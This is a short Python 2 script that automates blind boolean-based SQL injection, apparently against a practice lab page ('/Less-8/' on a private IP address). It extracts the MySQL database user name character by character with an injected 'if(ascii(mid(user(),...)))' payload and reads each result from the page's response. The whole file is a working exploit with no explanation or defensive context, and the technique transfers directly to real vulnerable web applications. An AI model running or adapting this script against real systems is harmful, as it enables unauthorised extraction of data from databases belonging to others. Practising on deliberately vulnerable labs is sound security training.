#!/usr/bin/env python
#encoding=utf-8

'''
GET -Blind-Boolian Based - Single String
'''

import httplib, time, string, sys, random

headers = {}

# payloads
payloads = list(string.ascii_letters) + list(string.digits) + ['@', '_', '.']

# target
host = '10.0.103.130'

print 'Start to retrive MySQL User:'

user = ''

for i in range (1, 30):
    for payload in payloads:
        try:
            conn = httplib.HTTPConnection(host, timeout=30)
            conn.request(method='GET',
                            url = "/Less-8/?id=1' AND (if(ascii(mid(user(), %s, 1))=%s, 1, 0))+--+" % (i, ord(payload)),
                            headers = headers
            )
            html_doc = conn.getresponse().read()
            conn.close()
            if html_doc.find("You") > 0:
                user += payload
                sys.stdout.write('\r[In Progress] '+ user)
                print
                sys.stdout.flush()
                break
            else:
                pass
        except:
            pass

print '\n[Done] MySQL user is ' + user
